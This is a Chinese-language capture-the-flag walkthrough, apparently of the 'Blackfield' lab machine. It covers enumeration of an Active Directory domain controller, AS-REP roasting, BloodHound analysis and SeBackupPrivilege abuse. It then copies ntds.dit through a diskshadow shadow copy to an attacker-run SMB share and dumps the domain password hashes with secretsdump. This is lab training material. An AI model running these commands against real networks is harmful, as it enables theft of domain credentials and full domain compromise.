对目标服务器服务器进行端口探测

```
sudo nmap -p- --min-rate 10000 10.10.10.192
```

![image-20241027144242237](https://s2.loli.net/2024/10/27/xZf1D9XM3WsNrGT.png)

针对开放的端口进行进一步服务探测

```
sudo nmap -p53,88,135,389,445,593,3268,5985 -A 10.10.10.192 -oX Blackfield.xml
```

![image-20241027144442368](https://s2.loli.net/2024/10/27/saWbPKfuJixn9CF.png)

根据扫描的结果优先添加hosts记录

```
10.10.10.192  BLACKFIELD.local
10.10.10.192  DC01.BLACKFIELD.local
```

优先针对LDAP进行相关扫描

```
ldapsearch -x -s base namingcontexts -H ldap://10.10.10.192:389
```

![image-20241027145722581](https://s2.loli.net/2024/10/27/jbDmL1YCaJwQuz7.png)

```
ldapsearch -x -b "DC=BLACKFIELD,DC=local" -H ldap://10.10.10.192:389
```

![image-20241027145839063](https://s2.loli.net/2024/10/27/jrR3TS9pheIA2bU.png)

ldap这块需要认证，没有进步可以进行探测的内容

重点放到smb相关的服务进行探测

```
smbclient -L //10.10.10.192
```

![image-20241027150349733](https://s2.loli.net/2024/10/27/luZVKtdr1QJzI2b.png)

发现可以进行匿名访问和登录，进行相应的访问，forensic文件夹无法登录，只能先登录profiles

```
smbclient //10.10.10.192/profiles$
```

发现存在非常多的文件夹，文件夹名称很可能是域内用户，开启递归使用dir检查后发现所有的文件夹均不存在文件，考虑将所有文件夹的用户名进行保存为users.txt，使用netexec进行smb验证爆破

```
netexec smb 10.10.10.192 -u users.txt -p passwords.txt --continue-on-success
```

![image-20241027155319385](https://s2.loli.net/2024/10/27/U3qVgYu8lAeRzyW.png)

结合针对所有用户名称的预验证扫描，UF_DONT_REQUIRE_PREAUTH=TRUE的会被扫描

```
impacket-GetNPUsers BLACKFIELD.local/ -usersfile users.txt -dc-ip 10.10.10.192
```

![image-20241027155433569](https://s2.loli.net/2024/10/27/LDCWOk3hm9iNKsF.png)

user:audit2020一定是一个真实的主机用户，同时获取到一个hash内容，是针对support用户的

仍然没有什么特殊的，既然获得了账号密码，尝试对LDAP进行认证

```
ldapsearch -H ldap://10.10.10.192:389 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > ldap.txt
```

能够获得一个输出文件，内容非常多

我们又尝试了是否能用现在的认证信息，尝试kerberoast攻击

```
impacket-GetUserSPNs -request -dc-ip 10.10.10.192 'blackfield.local/support:#00^BlackKnight'
```

![image-20241027163643451](https://s2.loli.net/2024/10/27/dEHlcC6YaQfPiqv.png)

也没有任何发现，这种情况下我们只能使用已经获取的认证信息，使用bloodhound-python进行一把信息收集

```
bloodhound-python -d 'blackfield.local' -u 'support' -p '#00^BlackKnight' -c all -ns 10.10.10.192
```

通过bloodhound进行分析，在first degree object control中看到support和audit2020存在ForceChangePassword关系，

![image-20241027164449360](https://s2.loli.net/2024/10/27/FWiGYKDq7HCy5gr.png)

可以看到用户处于backup组且具备SeBackupPrivilege的能力，所以允许进行完整的系统读取，我们使用以下工具进行内容的读取（https://github.com/giuliano108/SeBackupPrivilege），我们上传dll到

```
cp /home/zkpc/Tools/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll .
cp /home/zkpc/Tools/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll .
upload SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll
```

开始加载动态链接库

```
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
```

完成这一步我们可以对文件进行复制和读取，但我们无法读取root.txt文件，我们接着想读取ntds.dit文件，这是DC保存所有密码哈希的数据库

```
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
```

![image-20241027182319541](https://s2.loli.net/2024/10/27/2NfYVETHi58Jvyo.png)

无法读取，原因是正在被使用，那么我们就要考虑借助工具创建一个新的卷影，从而来实现ntds.dit文件的复制和查看，我们需要借助diskshadow工具

步骤一：在本地创建一个脚本

```
vi vss.dsh

#编辑内容
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:

#修改格式
unix2dos vss.dsh
```

步骤二：上传文件到目标服务器

```
upload vss.dsh c:\programdata\vss.dsh
```

步骤三：通过diskshadow工具进行创建

```
cd C:\windows\system32
diskshadow /s c:\programdata\vss.dsh
```

步骤四：攻击端开启smb服务

```
sudo impacket-smbserver share . -smb2support -username zk -password zk
```

步骤五：链接smb服务并复制读取相应文件

```
net use \\10.10.16.8\share /u:zk zk
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.16.8\share\ntds.dit
```

步骤六：要获得对应hash还需要system中的注册表键值，故需要进行保存

```
reg save HKLM\SYSTEM C:\system.hive
download system.hive
```

步骤七：破解对应的hash

```
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL
```
